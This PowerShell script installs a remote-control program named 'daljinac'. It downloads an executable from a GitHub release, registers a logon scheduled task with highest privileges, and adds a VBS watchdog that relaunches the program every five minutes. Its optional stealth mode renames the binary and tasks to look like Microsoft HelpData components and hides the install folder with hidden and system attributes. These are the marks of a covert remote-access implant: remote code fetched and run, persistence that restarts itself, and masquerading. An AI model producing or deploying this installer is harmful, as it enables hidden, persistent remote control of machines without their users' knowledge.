param([switch]$notray, [switch]$stealth)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

if ($stealth) {
    $Dir      = "C:\ProgramData\Microsoft\HelpData"
    $ExeName  = "HelpDataHost.exe"
    $TaskName = "MicrosoftHelpDataCollect"
    $WatchName = "MicrosoftHelpDataWatch"
    $ExtraArgs = "-stealth"
} else {
    $Dir      = "C:\daljinac"
    $ExeName  = "systemUI.exe"
    $TaskName = "Daljinac"
    $WatchName = "DaljinacWatch"
    $ExtraArgs = if ($notray) { "-notray" } else { "" }
}

$Exe = "$Dir\$ExeName"
$URL = "https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe"

Write-Host "[0a/3] Deleting old scheduled tasks..."
@("Daljinac","DaljinacWatch","MicrosoftHelpDataCollect","MicrosoftHelpDataWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}

Write-Host "[0b/3] Killing old processes..."
$maxWait = 20
do {
    Get-Process systemUI,daljinac,HelpDataHost -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Seconds 1
    $maxWait--
    $portFree = $true
    try { (Get-NetTCPConnection -LocalPort 8081 -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
    if ($maxWait -le 0) { break }
} while (-not $portFree)
Start-Sleep -Seconds 2

Write-Host "[1/3] Downloading..."
mkdir $Dir -Force | Out-Null
Invoke-WebRequest $URL -OutFile "$Exe.new" -UseBasicParsing
Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

Write-Host "[1b/3] Replacing old binary..."
Get-Process systemUI,HelpDataHost -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 1
Move-Item -Force "$Exe.new" $Exe

Write-Host "[2/3] Installing scheduled task..."
Remove-Item "$Dir\watchdog.vbs" -Force -ErrorAction SilentlyContinue

# Clean ALL task variants
@("Daljinac","DaljinacWatch","MicrosoftHelpDataCollect","MicrosoftHelpDataWatch") | ForEach-Object {
    schtasks /delete /tn $_ /f 2>$null
}

$taskCmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
$action  = New-ScheduledTaskAction -Execute $Exe -Argument $ExtraArgs
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet
$principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
$vbsContent = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $TaskName`", 0, False"
Set-Content -Path "$Dir\watchdog.vbs" -Value $vbsContent -Encoding ASCII
schtasks /create /tn $WatchName /tr "wscript.exe //B $Dir\watchdog.vbs" /sc MINUTE /mo 5 /f 2>$null

if ($stealth) {
    attrib +h +s $Dir
    Write-Host "       Stealth folder hidden (+h +s)"
}

Write-Host "[3/3] Starting..."
$cmd = if ($ExtraArgs) { "`"$Exe`" $ExtraArgs" } else { "`"$Exe`"" }
([wmiclass]'Win32_Process').Create($cmd) | Out-Null

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
if ($stealth) { Write-Host "  Mode: STEALTH (hidden folder, renamed binary, stealth task names)" }
elseif ($notray) { Write-Host "  Mode: no-tray (background)" }
